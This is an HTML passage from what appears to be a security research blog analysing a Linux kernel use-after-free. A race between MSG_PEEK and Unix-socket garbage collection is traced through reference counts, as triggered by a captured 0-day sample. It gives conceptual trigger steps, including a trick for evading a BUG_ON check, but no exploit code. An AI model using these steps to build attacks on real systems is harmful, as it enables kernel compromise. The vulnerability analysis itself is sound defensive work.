 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhi5B8kJXBAiYH3vq8NcQtmatM_hz8o9KgBZpMbMyd9QwRC84jh-SZo76fLhvSFrRohs4pUhBW48q3fQ0bUu0DlySHyJhDMC69rz8qwEM8nHK4b1RGLMw9QGwPmf4E7iMjo5Noa6eF-GDEuMqa4Gzq0fwiBCXU_x0i_Q7eGd2OqiIbu7lYFFaErVE5o/s1102/image62.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhi5B8kJXBAiYH3vq8NcQtmatM_hz8o9KgBZpMbMyd9QwRC84jh-SZo76fLhvSFrRohs4pUhBW48q3fQ0bUu0DlySHyJhDMC69rz8qwEM8nHK4b1RGLMw9QGwPmf4E7iMjo5Noa6eF-GDEuMqa4Gzq0fwiBCXU_x0i_Q7eGd2OqiIbu7lYFFaErVE5o/s1102/image62.png" border="0" alt="f00, f01, f10, f11 forms a breakable cycle." style="max-height: 750px; max-width: 600px;"title="f00, f01, f10, f11 forms a breakable cycle." /></a></span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c32">Breakable cycle by </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c32">and</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">Here is the status:</span></p><ul style="padding: 0;" class="c27 lst-kix_9gryrzygx46m-0 start"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = 2, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="c13 c19 c15">) = 2</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 0, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="c13 c19 c15">) = 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = 0, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="c13 c19 c15">) = 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 0, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 1</span></li></ul>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>If the garbage collection process happens now, before any </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;calls, the kernel will choose </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>&nbsp;as the garbage candidate. However, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>&nbsp;will not have the inflight count altered and the kernel will not purge any garbage.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>I</span><span>f </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;then calls </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c39">with</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag, t</span><span>he receive queue doesn&rsquo;t change and the inflight counts are not decremented. </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;gets a new file descriptor </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c8">&#39;</span><span>&nbsp;which increments the </span><span>reference count on </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c2">:</span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhO9D3ODJFXZt6dQmkyP1e7zZe0smN042wAbdy7isVbd407L-oCrSDS9LDCBshKwft2pWiuKHXQBclib4tQFoou-8U14ZNuyeJMRxDjtuFsTk3B_TDHVQNDl5x8aLt09negBlNpoEzrYgybadh-KbAAGu_U4hqaDNLyOpWFbI06Vjfh1kam2JHuD7yH/s1216/image63.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhO9D3ODJFXZt6dQmkyP1e7zZe0smN042wAbdy7isVbd407L-oCrSDS9LDCBshKwft2pWiuKHXQBclib4tQFoou-8U14ZNuyeJMRxDjtuFsTk3B_TDHVQNDl5x8aLt09negBlNpoEzrYgybadh-KbAAGu_U4hqaDNLyOpWFbI06Vjfh1kam2JHuD7yH/s1216/image63.png" border="0" alt="After f01 receives the socket file descriptor by MSG_PEEK, the reference count of f00 is incremented and the receive queue from f01 remains the same." style="max-height: 750px; max-width: 600px;"title="After f01 receives the socket file descriptor by MSG_PEEK, the reference count of f00 is incremented and the receive queue from f01 remains the same." /></a></span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c3 ykcrMYlEiJ-c38">MSG_PEEK</span><span class="ykcrMYlEiJ-c32">&nbsp;increment the reference count of </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="c34 c19 c32">&nbsp;while the receive queue is not cleared</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">Status:</span></p><ul style="padding: 0;" class="c27 lst-kix_9gryrzygx46m-0"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = 2, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="c13 c19 c15">) = 3</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 0, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="c50 c19 c49 c42">) = 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = 0, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="c50 c19 c49 c42">) = 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 0, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 1</span></li></ul>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Then, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;calls </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c39">without</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>&rsquo;s receive queue is removed. </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;also fetches a new file descriptor </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c8">&#39;&#39;</span><span class="ykcrMYlEiJ-c2">:</span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNsC7ADpPbHG_EVgFzDOGi6oaXluRrxDKc6kaQAkdwadnfFOu4SbwVESi0-SGHDwu9La-ztndastPnhfiocmhd6fmU0mhCy9a5sDosCQu6eW3x_uu7wHGL5d1c0eMTO3inZlhObh4faQkcGU2fM6zd-cXDjbg6fjS6CKUMpT8Sre9XHefE7Exrt04s/s1344/image67.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNsC7ADpPbHG_EVgFzDOGi6oaXluRrxDKc6kaQAkdwadnfFOu4SbwVESi0-SGHDwu9La-ztndastPnhfiocmhd6fmU0mhCy9a5sDosCQu6eW3x_uu7wHGL5d1c0eMTO3inZlhObh4faQkcGU2fM6zd-cXDjbg6fjS6CKUMpT8Sre9XHefE7Exrt04s/s1200/image67.png" border="0" alt="After f01 receives the socket file descriptor without MSG_PEEK, the receive queue is cleared and file descriptor f00&#39;&#39;&#39; is obtained." style="max-height: 750px; max-width: 600px;"title="After f01 receives the socket file descriptor without MSG_PEEK, the receive queue is cleared and file descriptor f00&#39;&#39;&#39; is obtained." /></a></span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c32">The receive queue of </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c32">&nbsp;is cleared and </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c8">&#39;&#39;</span><span class="ykcrMYlEiJ-c32">&nbsp;is obtained from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">Status:</span></p><ul style="padding: 0;" class="c27 lst-kix_9gryrzygx46m-0"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = 1, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="c13 c19 c15">) = 3</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 0, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="c13 c15 c19">) = 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = 0, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="c50 c19 c49 c42">) = 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 0, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 1</span></li></ul>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><h2 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.v0psi01ks7q2"><span class="ykcrMYlEiJ-c1">UAF Scenario</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>From a very high level perspective, the internal state of Linux garbage collection can be non-deterministic because </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;is not synchronized with the garbage collector. T</span><span>here is a race condition where the garbage collector can treat an inflight socket as a garbage candidate while the file reference is incremented at the same time during the </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;receive. As a consequence, the garbage collector may purge the candidate, freeing the socket buffer, while a receiver may install the file descriptor, leading to a UAF on the </span><span class="ykcrMYlEiJ-c3">skb</span><span class="ykcrMYlEiJ-c2">&nbsp;object.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Let&rsquo;s see how the captured </span><span>0-day</span><span>&nbsp;sample triggers the bug step by step (simplified version, in reality you may need more threads working together, but it should demonstrate the core idea). First of all, the sample allocates the following socket pairs and single socket </span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span><span>:</span></p><ul style="padding: 0;" class="c27 lst-kix_whw4pjgxp3w1-0 start"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">2</span><span class="ykcrMYlEiJ-c11">0</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">2</span><span class="ykcrMYlEiJ-c11">1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">3</span><span class="ykcrMYlEiJ-c11">0</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">3</span><span class="ykcrMYlEiJ-c11">1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">sock</span><span class="ykcrMYlEiJ-c15">&nbsp;&#x1d6fc;</span><span>&nbsp;(actually there might be even thousands of </span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span><span>&nbsp;for protracting the garbage collection process in order to evade a </span><span class="ykcrMYlEiJ-c3">BUG_ON</span><span class="ykcrMYlEiJ-c2">&nbsp;check which will be introduced later).</span></li></ul>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Now, the program does the below operations:</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAHUeccUboPeEe8ydW1HHpM2R-iibCZnsJSrhByCsnhQHtW4IJcC_8GEPtO3R3GPV5x2C9xJfxT7l6Z3UoqRcUeMtuf65G9wI2tPnd91q_vO7spVOfZgAwjeC6WCILmjs1ED618PGlxgMp196O3odP-fKaqIloMSEYRNory126HtXPNyyXCUWefJew/s564/image17.png" style="display: block; padding: 1em 0;text-align: left;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAHUeccUboPeEe8ydW1HHpM2R-iibCZnsJSrhByCsnhQHtW4IJcC_8GEPtO3R3GPV5x2C9xJfxT7l6Z3UoqRcUeMtuf65G9wI2tPnd91q_vO7spVOfZgAwjeC6WCILmjs1ED618PGlxgMp196O3odP-fKaqIloMSEYRNory126HtXPNyyXCUWefJew/s564/image17.png" border="0" alt="" style="max-height: 750px; max-width: 250px; border:0; box-shadow: none; --webkit-box-shadow: none; --moz-box-shadow: none;" title="" /></a></span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Close the following file descriptors prior to any </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span class="ykcrMYlEiJ-c2">&nbsp;calls:</span></p><ul style="padding: 0;" class="c27 lst-kix_9gryrzygx46m-0"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">Close</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="c13 c19 c15">)</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">Close</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="c50 c19 c49 c42">)</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">Close</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="c50 c19 c49 c42">)</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">Close</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="c13 c19 c15">)</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">Close</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">3</span><span class="ykcrMYlEiJ-c11">0</span><span class="c13 c19 c15">)</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">Close</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">3</span><span class="ykcrMYlEiJ-c11">1</span><span class="c13 c19 c15">)</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">Close</span><span class="ykcrMYlEiJ-c15">(&#x1d6fc;)</span></li></ul>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Here is the status:</span></p><ul style="padding: 0;" class="c27 lst-kix_9gryrzygx46m-0"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = </span><span class="ykcrMYlEiJ-c8">N</span><span class="ykcrMYlEiJ-c15">&nbsp;+ 1, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = </span><span class="ykcrMYlEiJ-c8">N </span><span class="c13 c19 c15">+ 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 2, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="c13 c19 c15">) = 2</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = 3, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="c13 c19 c15">) = 3</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 1, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="c50 c19 c49 c42">) = 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">2</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">) = 0, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">2</span><span class="ykcrMYlEiJ-c11">0</span><span class="c50 c19 c49 c42">) = 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">2</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 0, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">2</span><span class="ykcrMYlEiJ-c11">1</span><span class="c13 c19 c15">) = 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">3</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c15">) = 1, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">3</span><span class="ykcrMYlEiJ-c11">1</span><span class="c50 c19 c49 c42">) = 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">inflight</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span><span class="ykcrMYlEiJ-c15">) = 1, </span><span class="ykcrMYlEiJ-c8">ref</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span><span class="ykcrMYlEiJ-c15">) = 1</span></li></ul>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
